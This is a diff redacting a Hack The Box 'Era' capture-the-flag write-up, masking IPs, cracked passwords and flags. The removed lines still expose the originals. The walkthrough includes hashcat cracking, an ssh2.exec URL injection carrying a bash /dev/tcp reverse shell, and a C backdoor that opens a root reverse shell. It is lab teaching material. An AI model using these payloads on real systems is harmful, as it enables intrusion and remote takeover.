@@ -15,9 +15,9 @@ Author: [yurivich](https://app.hackthebox.com/users/169229)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.252.34
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 06:17 EDT
-Nmap scan report for 10.129.252.34
+Nmap scan report for 10.129.xx.xx
 Host is up (0.34s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -33,7 +33,7 @@ Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.252.34     era.htb
+10.129.xx.xx     era.htb
 ```
 
 So this machine go port `80` open, what make more interesting is that there is no port `22` or `2222` for ssh and only port `21` for ftp.
@@ -76,7 +76,7 @@ file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Durat
 Found `file` subdomain, add it to `/etc/hosts` file and check it out.
 
 ```bash
-10.129.252.34     era.htb file.era.htb
+10.129.xx.xx     era.htb file.era.htb
 ```
 
 ![era](/assets/img/era-htb-season8/era-htb-season8_file_page.png)
@@ -441,19 +441,19 @@ So there is using `bcrypt` hash, let's crack it out.
 └─$ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt -w 3 -O --username
 
 └─$ hashcat -m 3200 hashes.txt --show --username
-eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
-yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang
+eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:amxxxxx
+yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:musxxxx
 ```
 
-Got `eric:america` and `yuri:mustang`. Normal there will be a port `22` and we can ssh and easily grab the `user.txt` flag. <br>
+Got `eric:amxxxxx` and `yuri:musxxxx`. Normal there will be a port `22` and we can ssh and easily grab the `user.txt` flag. <br>
 But this machine just have a port `21` for ftp so we gonna connect and use these two credentials.
 
 ### FTP
 ```bash
-└─$ ftp 10.129.252.34
-Connected to 10.129.252.34.
+└─$ ftp 10.129.xx.xx
+Connected to 10.129.xx.xx.
 220 (vsFTPd 3.0.5)
-Name (10.129.252.34:kali): yuri
+Name (10.129.xx.xx:kali): yuri
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -467,7 +467,7 @@ drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
 226 Directory send OK.
 ```
 
-After trying, just only `yuri:mustang` can login to ftp. Maybe `eric` is for other part that could be internal and escalate to root. <br>
+After trying, just only `yuri:musxxxx` can login to ftp. Maybe `eric` is for other part that could be internal and escalate to root. <br>
 Recon and found out there is two folder `apache2_conf` and `php8.1_conf`.
 
 ```bash
@@ -542,13 +542,13 @@ ftp> lcd ..                       # Back to local parent
 Or we can use `mget` to download all files at once.
 
 ```bash
-└─$ wget -r --ftp-user=yuri --ftp-password=mustang ftp://10.129.252.34/ -P era_ftp_files/
+└─$ wget -r --ftp-user=yuri --ftp-password=musxxxx ftp://10.129.xx.xx/ -P era_ftp_files/
 ```
 
 ```bash
 └─$ tree .
 .
-└── 10.129.252.34
+└── 10.129.xx.xx
     ├── apache2_conf
     │   ├── 000-default.conf
     │   ├── apache2.conf
@@ -738,10 +738,10 @@ listening on [any] 3333 ...
 
 > You can either use this or [pwncat](https://github.com/calebstewart/pwncat) or even [penelope](https://github.com/brightio/penelope).
 
-We gonna use this one `bash -c 'bash -i >& /dev/tcp/10.10.16.22/3333 0>&1;true'` to get a reverse shell.
+We gonna use this one `bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1;true'` to get a reverse shell.
 
 ```bash
-http://file.era.htb/download.php?id=8052&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.22%2F3333%200%3E%261;true%27
+http://file.era.htb/download.php?id=8052&show=true&format=ssh2.exec://eric:amxxxxx@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.xx.xx.xx%2F3333%200%3E%261;true%27
 ```
 
 BOOM! We got a reverse shell.
@@ -749,7 +749,7 @@ BOOM! We got a reverse shell.
 ```bash
 └─$ nc -lvnp 3333
 listening on [any] 3333 ...
-connect to [10.10.16.22] from (UNKNOWN) [10.129.198.181] 40698
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 40698
 bash: cannot set terminal process group (5132): Inappropriate ioctl for device
 bash: no job control in this shell
 eric@era:~$ ls -la
@@ -765,7 +765,7 @@ drwx------ 2 eric eric 4096 Sep 17  2024 .ssh
 -rw-r----- 1 root eric   33 Jul 28 14:55 user.txt
 eric@era:~$ cat user.txt
 cat user.txt
-0b03d09e6b5ea3b0e5296f1e165dca56
+0b03d0xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `user.txt` flag.
@@ -774,7 +774,7 @@ I have tried the [penelope](https://github.com/brightio/penelope) and it works.
 
 ```bash
 └─$ penelope -p 4444
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 10.10.16.26
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from era~10.129.253.96-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
@@ -821,7 +821,7 @@ First let's create a `backdoor.c` file based on `C` code.
 ```c
 #include <stdlib.h>
 int main() {
-    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.22/9999 0>&1'");
+    system("/bin/bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/9999 0>&1'");
     return 0;
 }
 ```
@@ -872,7 +872,7 @@ Waiting for a second, for my case it took about 30 seconds to 1 minute.
 ```bash
 └─$ nc -lvnp 9999
 listening on [any] 9999 ...
-connect to [10.10.16.22] from (UNKNOWN) [10.129.198.181] 57822
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 57822
 bash: cannot set terminal process group (5881): Inappropriate ioctl for device
 bash: no job control in this shell
 root@era:~# ls -la
@@ -896,7 +896,7 @@ drwx------  2 root root  4096 Dec 15  2024 .ssh
 -rw-r-----  1 root root    33 Jul 28 14:55 root.txt
 root@era:~# cat root.txt
 cat root.txt
-44f605ebc62470f16a372c9045e53173
+44f605xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Got the reverse shell as `root` user. <br>
